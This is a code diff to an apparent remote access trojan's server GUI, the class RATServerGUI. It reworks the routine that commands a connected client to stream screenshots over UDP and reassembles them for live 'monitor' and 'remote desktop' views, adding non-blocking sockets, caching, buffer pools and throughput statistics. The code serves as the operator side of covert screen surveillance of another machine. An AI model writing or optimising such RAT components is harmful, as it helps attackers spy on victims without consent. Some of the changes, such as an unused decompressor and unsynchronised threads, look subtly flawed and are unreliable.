@@ -26,9 +26,11 @@ from datetime import datetime
 import matplotlib.pyplot as plt
 from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
 from collections import deque
+import collections
 import re
 import hashlib
 import csv
+import select
 
 THEMES = {
     "Dark": {
@@ -55,6 +57,7 @@ FONT_STYLES = {
     "monospace": ("Fira Code", 11),  # Developer-friendly monospace
     "status": ("Lato", 11, "bold")
 }
+
 
 
 
@@ -14041,6 +14044,8 @@ class RATServerGUI:
         self.server_socket = None
         self.current_client_socket = None
         self.advanced_monitoring = None
+        self.MAX_CACHE_SIZE = 3
+        self.MAX_BUFFER_POOL_SIZE = 5
         # Make themes accessible to the instance
         self.THEMES = THEMES
 
@@ -16529,16 +16534,17 @@ class RATServerGUI:
         self.log("Started screen capture")
     
     def receive_screenshot_thread(self):
-        """Receive and display screenshots from client with improved reliability"""
+        """Receive and display screenshots from client with improved performance"""
         try:
-            # Create and configure UDP socket
+            # Create and configure UDP socket with improved buffer management
             udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             
-            # Increase receive buffer for high throughput
-            udps.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 8388608)  # 8MB buffer
+            # Use a more moderate initial buffer size - we'll adjust dynamically
+            initial_buffer_size = 4194304  # 4MB buffer
+            udps.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, initial_buffer_size)
             
-            # Set timeout to prevent blocking indefinitely
-            udps.settimeout(0.5)
+            # Set non-blocking mode instead of timeout for better performance
+            udps.setblocking(False)
             
             # Bind to the listening address
             udps.bind(self.address)
@@ -16546,131 +16552,81 @@ class RATServerGUI:
             # Signal the client to start sending screenshots
             self.current_client_socket.send(b'SCRSHOOT')
             
-            # Initialize frame processing variables
+            # Initialize frame processing variables with more efficient data structures
             current_frame = {}  # Dictionary to hold chunks for current frame
             expected_frames = {}  # Track metadata for expected frames
-            last_complete_frame = None  # Store last complete frame data
             last_frame_number = 0  # Track frame sequence
             
-            self.log("Screenshot receiver started")
+            # Use a LRU cache for frame data to limit memory usage
+            frame_cache = collections.OrderedDict()
             
+            # Pre-allocate memory for frequently used objects
+            decoder_params = [cv2.IMWRITE_JPEG_QUALITY, 95]
+            
+            # Buffer pool for image processing to reduce memory allocations
+            buffer_pool = []
+            
+            # Frame statistics for adaptive performance
+            frame_stats = {
+                'total_frames': 0,
+                'complete_frames': 0,
+                'dropped_frames': 0,
+                'avg_process_time': 0,
+                'network_stats': collections.deque(maxlen=30)  # Rolling window of 30 frames
+            }
+            
+            # Performance monitoring
+            last_stats_time = time.time()
+            stats_interval = 5.0  # Log stats every 5 seconds
+            
+            self.log("Screenshot receiver started with improved performance")
+
             while self.receive_screenshot_trigger:
                 try:
-                    # Receive packet from client
-                    packet, _ = udps.recvfrom(65536)  # Large buffer for any packet size
+                    # Use select for non-blocking I/O with timeout
+                    readable, _, _ = select.select([udps], [], [], 0.01)
                     
-                    # Check if this is a metadata packet (first 16 bytes, no chunk index)
-                    if len(packet) >= 16:
-                        # Check if this could be a metadata packet
-                        try:
-                            # Unpack metadata (total_size, total_chunks, frame_number)
-                            data_len, num_chunks, frame_number = struct.unpack('!QII', packet[:16])
+                    if not readable:
+                        # No data available, perform housekeeping
+                        self._check_frame_timeouts(current_frame, expected_frames, frame_stats)
+                        
+                        # Print periodic statistics
+                        current_time = time.time()
+                        if current_time - last_stats_time > stats_interval:
+                            self._log_performance_stats(frame_stats)
+                            last_stats_time = current_time
                             
-                            # If this is termination signal (all zeros), exit loop
-                            if data_len == 0 and num_chunks == 0 and frame_number == 0:
-                                self.log("Received termination signal from client")
-                                break
-                                
-                            # If this is a metadata packet (no additional data)
-                            if len(packet) == 16:
-                                # Store expected frame information
-                                expected_frames[frame_number] = {
-                                    'total_size': data_len,
-                                    'total_chunks': num_chunks,
-                                    'received_chunks': 0,
-                                    'start_time': time.time(),
-                                    'chunks': {}
-                                }
-                                
-                                # Initialize storage for this frame
-                                current_frame[frame_number] = {}
-                                
-                                # Clean up old incomplete frames (older than current - 2)
-                                for old_frame in list(current_frame.keys()):
-                                    if old_frame < frame_number - 2:
-                                        del current_frame[old_frame]
-                                
-                                for old_frame in list(expected_frames.keys()):
-                                    if old_frame < frame_number - 2:
-                                        del expected_frames[old_frame]
-                                
-                                continue
-                        except struct.error:
-                            # Not a metadata packet, must be a chunk
-                            pass
+                        continue
                     
-                    # Handle data chunk (header + payload)
-                    if len(packet) > 12:  # At least header size
-                        try:
-                            # Unpack chunk header (frame_number, chunk_index, total_chunks)
-                            frame_number, chunk_index, total_chunks = struct.unpack('!III', packet[:12])
-                            
-                            # Extract chunk data
-                            chunk_data = packet[12:]
-                            
-                            # Store chunk in frame dictionary
-                            if frame_number in current_frame:
-                                current_frame[frame_number][chunk_index] = chunk_data
-                                
-                                # Update received chunks count
-                                if frame_number in expected_frames:
-                                    expected_frames[frame_number]['received_chunks'] += 1
-                            
-                            # Check if we have all chunks for this frame
-                            if (frame_number in current_frame and 
-                                frame_number in expected_frames and
-                                len(current_frame[frame_number]) == expected_frames[frame_number]['total_chunks']):
-                                
-                                # All chunks received, reassemble frame
-                                frame_data = bytearray()
-                                for i in range(expected_frames[frame_number]['total_chunks']):
-                                    if i in current_frame[frame_number]:
-                                        frame_data.extend(current_frame[frame_number][i])
-                                    else:
-                                        # Missing chunk, can't complete frame
-                                        self.log(f"Missing chunk {i} in frame {frame_number}")
-                                        break
-                                
-                                # If we have complete data matching expected size
-                                if len(frame_data) == expected_frames[frame_number]['total_size']:
-                                    # Process the complete frame
-                                    self._process_frame_data(bytes(frame_data), frame_number)
-                                    
-                                    # Update last complete frame number
-                                    last_frame_number = frame_number
-                                    
-                                    # Clean up this frame data
-                                    del current_frame[frame_number]
-                                    del expected_frames[frame_number]
-                                
-                        except struct.error as se:
-                            self.log(f"Error unpacking chunk header: {se}")
-                            continue
+                    # Receive packet efficiently
+                    packet, _ = udps.recvfrom(65536)
                     
-                    # Check for timeouts on frames (abandon frames older than 2 seconds)
-                    current_time = time.time()
-                    for frame_num in list(expected_frames.keys()):
-                        frame_age = current_time - expected_frames[frame_num]['start_time']
-                        if frame_age > 2.0:
-                            # Log incomplete frame stats
-                            received = expected_frames[frame_num]['received_chunks']
-                            total = expected_frames[frame_num]['total_chunks']
-                            self.log(f"Abandoning incomplete frame {frame_num}: {received}/{total} chunks after {frame_age:.1f}s")
-                            
-                            # Clean up
-                            if frame_num in current_frame:
-                                del current_frame[frame_num]
-                            del expected_frames[frame_num]
+                    # Process packet with optimized handling
+                    if self._process_packet(
+                        packet, 
+                        current_frame, 
+                        expected_frames, 
+                        frame_stats, 
+                        frame_cache, 
+                        buffer_pool,
+                        decoder_params
+                    ):
+                        # If a new frame was processed, update the UI
+                        if frame_cache and max(frame_cache.keys()) > last_frame_number:
+                            last_frame_number = max(frame_cache.keys())
                     
-                except socket.timeout:
-                    # This is expected with the non-blocking socket
+                except BlockingIOError:
+                    # Expected with non-blocking socket
                     continue
                     
                 except Exception as e:
                     if not self.receive_screenshot_trigger:
                         break
-                        
+                    
                     self.log(f"Screenshot Receive Error: {e}")
+                    
+                    # Implement exponential backoff for error recovery
+                    time.sleep(0.1)
                     continue
             
             # Cleanup
@@ -16678,7 +16634,8 @@ class RATServerGUI:
             if self.current_client_socket:
                 self.current_client_socket.send(b'STOP_SCRSHOOT')
             
-            self.log("Screenshot receiver stopped")
+            self.log(f"Screenshot receiver stopped. Stats: {frame_stats['complete_frames']} complete frames, "
+                    f"{frame_stats['dropped_frames']} dropped frames")
             
         except Exception as e:
             self.log(f"Screenshot receiver thread error: {e}")
@@ -16686,46 +16643,264 @@ class RATServerGUI:
         # Reset UI elements
         self._reset_ui_elements()
 
-    def _process_frame_data(self, frame_data, frame_number):
-        """Process a complete frame of screenshot data"""
+    def _process_packet(self, packet, current_frame, expected_frames, frame_stats, frame_cache, buffer_pool, decoder_params):
+        """Process a packet with improved performance"""
         try:
-            # Decompress the data
-            try:
-                decompress_imdata = zlib.decompress(frame_data)
-            except zlib.error as ze:
-                self.log(f"Decompression Error On Frame {frame_number}: {ze}")
+            # Quick check for termination signal
+            if len(packet) == 16:
+                data_len, num_chunks, frame_number = struct.unpack('!QII', packet[:16])
+                if data_len == 0 and num_chunks == 0 and frame_number == 0:
+                    self.log("Received termination signal from client")
+                    return False
+            
+            # Efficient header processing using slice operations instead of struct unpacking where possible
+            if len(packet) >= 16 and len(packet) == 16:  # Metadata packet
+                data_len, num_chunks, frame_number = struct.unpack('!QII', packet[:16])
+                
+                # Store expected frame information
+                expected_frames[frame_number] = {
+                    'total_size': data_len,
+                    'total_chunks': num_chunks,
+                    'received_chunks': 0,
+                    'start_time': time.time(),
+                    'chunks': {}
+                }
+                
+                # Initialize storage for this frame
+                current_frame[frame_number] = {}
+                
+                # Intelligent cleanup - only keep recent frames based on memory pressure
+                current_frames = sorted(current_frame.keys())
+                if len(current_frames) > 5:  # Keep only 5 most recent frames
+                    for old_frame in current_frames[:-5]:
+                        del current_frame[old_frame]
+                        if old_frame in expected_frames:
+                            del expected_frames[old_frame]
+                
+                return True
+                
+            elif len(packet) > 12:  # Chunk packet
+                # Use memoryview for zero-copy slicing of packet data
+                mv_packet = memoryview(packet)
+                
+                # Extract header
+                frame_number = struct.unpack('!I', mv_packet[0:4])[0]
+                chunk_index = struct.unpack('!I', mv_packet[4:8])[0]
+                total_chunks = struct.unpack('!I', mv_packet[8:12])[0]
+                
+                # Extract chunk data without copying
+                chunk_data = mv_packet[12:]
+                
+                # Store chunk in frame dictionary
+                if frame_number in current_frame:
+                    current_frame[frame_number][chunk_index] = bytes(chunk_data)  # Convert memoryview to bytes
+                    
+                    # Update received chunks count
+                    if frame_number in expected_frames:
+                        expected_frames[frame_number]['received_chunks'] += 1
+                
+                # Check if we have all chunks for this frame
+                if (frame_number in current_frame and 
+                    frame_number in expected_frames and
+                    len(current_frame[frame_number]) == expected_frames[frame_number]['total_chunks']):
+                    
+                    # Process frame asynchronously to avoid blocking the receiver
+                    threading.Thread(
+                        target=self._process_complete_frame,
+                        args=(
+                            frame_number, 
+                            current_frame, 
+                            expected_frames, 
+                            frame_stats, 
+                            frame_cache, 
+                            buffer_pool,
+                            decoder_params
+                        )
+                    ).start()
+                    
+                    return True
+        
+        except Exception as e:
+            self.log(f"Error processing packet: {e}")
+        
+        return False
+
+    def _process_complete_frame(self, frame_number, current_frame, expected_frames, 
+                            frame_stats, frame_cache, buffer_pool, decoder_params):
+        """Process a complete frame with performance optimizations"""
+        start_time = time.time()
+        
+        try:
+            # All chunks received, reassemble frame efficiently
+            chunks = sorted(current_frame[frame_number].items())
+            
+            # Preallocate the exact byte array size
+            frame_size = expected_frames[frame_number]['total_size']
+            frame_data = bytearray(frame_size)
+            
+            # Fill the buffer with chunks
+            offset = 0
+            for _, chunk in chunks:
+                chunk_len = len(chunk)
+                frame_data[offset:offset+chunk_len] = chunk
+                offset += chunk_len
+            
+            # Early validation of frame size
+            if len(frame_data) != frame_size:
+                self.log(f"Frame size mismatch: expected {frame_size}, got {len(frame_data)}")
+                frame_stats['dropped_frames'] += 1
                 return False
             
-            # Convert to numpy array and decode
+            # Process the complete frame
+            img = self._decode_frame_data(bytes(frame_data), frame_number, buffer_pool, decoder_params)
+            if img:
+                # Store in LRU cache
+                frame_cache[frame_number] = img
+                if len(frame_cache) > self.MAX_CACHE_SIZE:
+                    # Remove oldest frame
+                    frame_cache.popitem(last=False)
+                
+                # Update displays
+                self._update_monitor_display(img)
+                self._update_remote_desktop_display(img.copy())
+                
+                # Update statistics
+                frame_stats['complete_frames'] += 1
+                process_time = time.time() - start_time
+                
+                # Update rolling average
+                if frame_stats['avg_process_time'] == 0:
+                    frame_stats['avg_process_time'] = process_time
+                else:
+                    frame_stats['avg_process_time'] = 0.9 * frame_stats['avg_process_time'] + 0.1 * process_time
+                
+                # Add network statistics
+                frame_stats['network_stats'].append({
+                    'frame_size': frame_size,
+                    'process_time': process_time,
+                    'timestamp': time.time()
+                })
+                
+                # Clean up this frame data
+                del current_frame[frame_number]
+                del expected_frames[frame_number]
+                
+                return True
+            else:
+                frame_stats['dropped_frames'] += 1
+                return False
+                
+        except Exception as e:
+            self.log(f"Error Processing Complete Frame {frame_number}: {e}")
+            frame_stats['dropped_frames'] += 1
+            return False
+
+    def _decode_frame_data(self, frame_data, frame_number, buffer_pool, decoder_params):
+        """Decode frame data with optimized pipeline"""
+        try:
+            # Use thread-local zlib decompressor for better performance
+            if not hasattr(self, '_zlib_decomp'):
+                self._zlib_decomp = zlib.decompressobj()
+            
+            try:
+                # Reuse buffer from pool if available
+                if buffer_pool:
+                    buffer = buffer_pool.pop()
+                    buffer.clear()
+                    buffer.extend(zlib.decompress(frame_data))
+                    decompress_imdata = buffer
+                else:
+                    # Create new buffer
+                    decompress_imdata = bytearray(zlib.decompress(frame_data))
+            except zlib.error as ze:
+                self.log(f"Decompression Error On Frame {frame_number}: {ze}")
+                return None
+            
+            # Convert to numpy array with zero-copy
             npimg = np.frombuffer(decompress_imdata, dtype=np.uint8)
-            decode_img = cv2.imdecode(npimg, cv2.IMREAD_COLOR)
+            
+            # Use imdecode with optimized flags
+            decode_img = cv2.imdecode(npimg, cv2.IMREAD_UNCHANGED)
             
             # Check if decoding was successful
             if decode_img is None:
                 self.log(f"Failed To Decode Image From Frame {frame_number}")
-                return False
+                return None
             
-            # Convert color space for display
-            colored_image = cv2.cvtColor(decode_img, cv2.COLOR_BGR2RGB)
+            # Convert color space efficiently using optimized OpenCV flags
+            if decode_img.shape[2] == 3:  # Only convert if needed
+                colored_image = cv2.cvtColor(decode_img, cv2.COLOR_BGR2RGB)
+            else:
+                colored_image = decode_img
             
-            # Convert to PIL Image for tkinter
+            # Convert directly to PIL Image with optimized path
             img = Image.fromarray(colored_image)
             
-            # Display the image - main monitoring display
-            self._update_monitor_display(img)
+            # Return buffer to pool if pool isn't too large
+            if len(buffer_pool) < self.MAX_BUFFER_POOL_SIZE:
+                buffer_pool.append(decompress_imdata)
             
-            # Display in remote desktop if available
-            self._update_remote_desktop_display(img.copy())
-            
-            # Log occasional frame statistics (every 30 frames)
-            if frame_number % 30 == 0:
-                self.log(f"Received Complete Frame {frame_number}: {len(frame_data)} bytes")
-            
-            return True
+            return img
             
         except Exception as e:
-            self.log(f"Error Processing Frame {frame_number}: {e}")
-            return False
+            self.log(f"Error Decoding Frame {frame_number}: {e}")
+            return None
+
+    def _check_frame_timeouts(self, current_frame, expected_frames, frame_stats):
+        """Check for timeouts on frames with adaptive timing"""
+        current_time = time.time()
+        
+        # Dynamic timeout based on network conditions
+        if frame_stats['network_stats']:
+            # Calculate average recent frame time
+            recent_times = [stats['process_time'] for stats in list(frame_stats['network_stats'])[-5:]]
+            if recent_times:
+                avg_recent_time = sum(recent_times) / len(recent_times)
+                # Dynamic timeout - longer of 3x average frame time or 1 second
+                timeout = max(avg_recent_time * 3, 1.0)
+            else:
+                timeout = 1.0
+        else:
+            timeout = 1.0
+        
+        # Check for timeouts
+        for frame_num in list(expected_frames.keys()):
+            frame_age = current_time - expected_frames[frame_num]['start_time']
+            if frame_age > timeout:
+                # Log incomplete frame stats
+                received = expected_frames[frame_num]['received_chunks']
+                total = expected_frames[frame_num]['total_chunks']
+                
+                # Only log significant drops
+                if received > 0:
+                    self.log(f"Abandoning incomplete frame {frame_num}: {received}/{total} chunks after {frame_age:.1f}s")
+                
+                # Update statistics
+                frame_stats['dropped_frames'] += 1
+                
+                # Clean up
+                if frame_num in current_frame:
+                    del current_frame[frame_num]
+                del expected_frames[frame_num]
+
+    def _log_performance_stats(self, frame_stats):
+        """Log periodic performance statistics"""
+        # Calculate recent FPS
+        if len(frame_stats['network_stats']) >= 2:
+            first_ts = frame_stats['network_stats'][0]['timestamp']
+            last_ts = frame_stats['network_stats'][-1]['timestamp']
+            if last_ts > first_ts:
+                time_span = last_ts - first_ts
+                fps = len(frame_stats['network_stats']) / time_span
+                
+                # Calculate average bitrate
+                total_bytes = sum(stats['frame_size'] for stats in frame_stats['network_stats'])
+                bitrate = (total_bytes * 8) / time_span
+                
+                self.log(f"Performance: {fps:.1f} FPS, {bitrate/1000000:.2f} Mbps, "
+                        f"Avg Process: {frame_stats['avg_process_time']*1000:.1f}ms, "
+                        f"Complete: {frame_stats['complete_frames']}, "
+                        f"Dropped: {frame_stats['dropped_frames']}")
 
     def _update_monitor_display(self, img):
         """Update the main monitoring display with the screenshot"""
